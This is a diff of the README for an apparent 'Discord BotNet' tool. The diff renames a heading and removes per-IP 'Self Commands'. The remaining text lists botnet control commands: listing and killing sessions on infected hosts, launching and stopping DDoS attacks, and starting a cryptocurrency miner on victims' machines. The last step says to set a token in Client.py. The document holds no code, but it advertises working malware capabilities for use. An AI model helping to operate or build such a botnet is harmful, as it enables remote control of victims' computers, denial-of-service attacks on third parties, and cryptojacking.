@@ -1,7 +1,7 @@
 # Discord BotNet
 ![image](https://user-images.githubusercontent.com/104208624/198850198-bba917b1-3135-430f-8b21-cbd987fcd48e.png)
 
-# Bot Commands
+# Commands
 * !help                   # Help menu
 * !clear                  # Clear chat
 * !sessions               # List open sessions
@@ -12,14 +12,6 @@
 * !stopddos               # Stops DDoS Attack
 * !miner < wallet >         # Start miner
 * !stopminer              # Stop miner
-
-# Self Commands
-* !kill.< ip >                  # Close session
-* !shell.< ip > < cmd >           # Run command
-* !ddos.< ip > < ip > < byte >      # Starts DDoS Attack
-* !stopddos.< ip >              # Stops DDoS Attack
-* !miner.< ip > < wallet >        # Start miner
-* !stopminer.< ip >             # Stop miner
 
 # How to use
 Edit token on Client.py
